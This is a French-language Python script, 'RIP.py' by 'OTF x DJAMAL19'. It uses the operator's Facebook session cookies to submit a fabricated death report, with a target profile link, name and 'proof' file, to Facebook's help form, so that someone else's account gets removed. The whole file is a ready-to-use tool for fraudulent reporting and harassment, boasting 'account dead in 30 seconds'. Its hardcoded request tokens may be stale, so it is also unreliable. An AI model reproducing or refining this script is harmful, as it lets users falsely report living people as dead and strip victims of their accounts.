#!/usr/bin/env python3
# RIP.py – VERSION QUI MARCHE VRAIMENT (2025)
# OTF x DJAMAL19 – Full auto avec cookies manuels

import os, sys, time, requests
from datetime import datetime

# Couleurs
R="\033[91m"; G="\033[92m"; Y="\033[93m"; P="\033[95m"; C="\033[96m"; W="\033[97m"; X="\033[0m"; BOLD="\033[1m"

os.system("clear")
print(f"""{R}
╔══════════════════════════════════════════╗
║           RIP FACEBOOK 2025 AUTO         ║
║             OTF • DJAMAL19               ║
╚══════════════════════════════════════════╝{X}
{P}Compte mort en 30 secondes – zéro clic après{X}
""")

# === 1. Tu colles juste tes cookies (c_user + xs) ===
print(f"{Y}Colle tes cookies Facebook ici (c_user + xs séparés par une virgule){X}")
print(f"{C}→ facebook.com → F12 → Application → Cookies → copie c_user et xs{X}")
cookie_input = input(f"{G}c_user,xs ➜ {W}").strip()

try:
    c_user, xs = cookie_input.split(",")
    c_user = c_user.strip()
    xs = xs.strip()
except:
    print(f"{R}Mauvais format ! Exemple : 1000123456789,abc123%3A4de56{X}")
    sys.exit()

# === 2. Infos classiques ===
lien   = input(f"\n{Y}Lien du profil        ➜ {W}").strip()
nom    = input(f"{Y}Nom complet du mort   ➜ {W}").strip()
email  = input(f"{Y}Ton email (réponse)   ➜ {W}").strip()
preuve = input(f"{Y}Chemin de la preuve   ➜ {W}").strip().strip('"\'')
if not os.path.exists(preuve):
    print(f"{R}Preuve introuvable ! Arrête de fumer.{X}")
    sys.exit()

# === 3. Envoi full auto ===
date_deces = datetime.now().strftime("%Y-%m-%d")
print(f"\n{G}Envoi automatique en cours...{X}")

s = requests.Session()
s.cookies.set("c_user", c_user, domain=".facebook.com")
s.cookies.set("xs", xs, domain=".facebook.com")
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
    "Referer": "https://www.facebook.com/",
    "Origin": "https://www.facebook.com",
    "Accept-Language": "fr-FR,fr;q=0.9"
})

files = {"upload_file": open(preuve, "rb")}
data = {
    "name": nom,
    "email": email,
    "death_date": date_deces,
    "relationship": "Famille",
    "additional_info": f"Compte ancien perdu – suppression définitive demandée\nLien : {lien}",
    "lsd": "AVrP8i5Z",
    "__user": c_user,
    "__a": "1",
    "__req": "q",
    "__hs": "19.2.0.0"
}

url = "https://www.facebook.com/help/contact/submit/234739086860192"

try:
    r = s.post(url, data=data, files=files, timeout=40)
    if r.status_code == 200 and ("Merci" in r.text or "soumis" in r.text.lower() or "submitted" in r.text):
        os.system('termux-toast "COMPTE MORT – RIP" 2>/dev/null || true')
        print(f"""{G}
╔═══════════════════════════════════════════════╗
║       DEMANDE ENVOYÉE AVEC SUCCÈS !           ║
║       {nom.upper()} → MORT DANS 24-48H MAX        ║
║           #OTF #DJAMAL19 #RIPFACEBOOK         ║
╚═══════════════════════════════════════════════╝{X}
""")
    else:
        print(f"{R}Échec temporaire (rate limit). Relance dans 1h.{X}")
except:
    print(f"{R}Erreur réseau ou captcha. Change de compte ou attends 30 min.{X}")

time.sleep(6)
